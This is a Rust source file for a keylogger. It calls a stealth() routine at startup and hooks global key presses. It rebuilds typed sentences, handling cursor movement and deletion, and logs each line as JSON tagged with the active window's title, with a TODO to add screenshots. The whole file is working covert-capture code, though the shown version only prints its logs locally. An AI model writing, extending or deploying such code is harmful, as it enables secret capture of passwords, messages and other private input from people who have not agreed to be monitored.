use crate::modules::{window::title::*};
use rdev::{EventType::*, Key::*};
use serde_json::json;
mod modules;

// TODO: Ignore certain applications e.g.
// TODO: Take screenshots to show more
// TODO: Cleanup this damn code.
fn main() {
    stealth();

    let mut cursor_pos = 0;

    let mut key_buffer: Vec<String> = Vec::new();

    let mut words: Vec<String> = Vec::new();

    rdev::listen(move |event| {
        let key = match event.event_type {
            KeyPress(key) => Some(key),
            _ => None,
        };
        let sentence = key_buffer.iter().map(|s| &*s.trim()).collect::<String>();

        if let Some(key) = key {
            match key {
                Space => {
                    cursor_pos = 0;
                    key_buffer.clear();
                    key_buffer.push(" ".to_string());
                    sentence.split_whitespace().for_each(|s| {
                        words.push(s.to_string());
                    });
                    key_buffer.clear();
                }
                LeftArrow => {
                    if cursor_pos >= 1 {
                        cursor_pos -= 1;
                    }
                }
                RightArrow => {
                    if cursor_pos < key_buffer.len() {
                        cursor_pos += 1;
                    };
                }
                Backspace | Delete => {
                    let kcode: Option<u8> = match event.name {
                        Some(key) => {
                            let kcode = key.bytes().last().unwrap();
                            Some(kcode)
                        }
                        None => None,
                    };
                    if kcode == Some(127_u8) {
                        // DEL WORD
                    } else if cursor_pos >= 1 {
                        key_buffer.remove(cursor_pos - 1);
                        // BACKSPACE
                        cursor_pos -= 1;
                    } else {
                        // DELETE
                    }
                }
                Return => {
                    words.push(key_buffer.join(""));
                    if words.last().unwrap() == "" {
                        words.remove(words.len() - 1);
                    }
                    let sentence_from_words = words.join(" ");
                    words.clear();
                    key_buffer.clear();
                    cursor_pos = 0;
                    if sentence_from_words.trim() != "" {
                        let log = json!({
                            "rid": "0001",
                            "text": sentence_from_words,
                            "window": get_window_name(),
                        });
                        println!("{}", log);
                    }
                }
                _ => {
                    if let Some(key) = event.name {
                        if key.bytes().last() < Some(127_u8) && key.bytes().last() > Some(31_u8) {
                            add_key_to_kb(key, &mut key_buffer, cursor_pos).unwrap();
                            cursor_pos += 1;
                        }
                    }
                }
            };
        }
    })
    .unwrap();
}

// Adds keys to kb
fn add_key_to_kb(key: String, kb: &mut Vec<String>, pos: usize) -> Result<(), Box<dyn std::error::Error>> {
    kb.insert(pos, key);
    Ok(())
}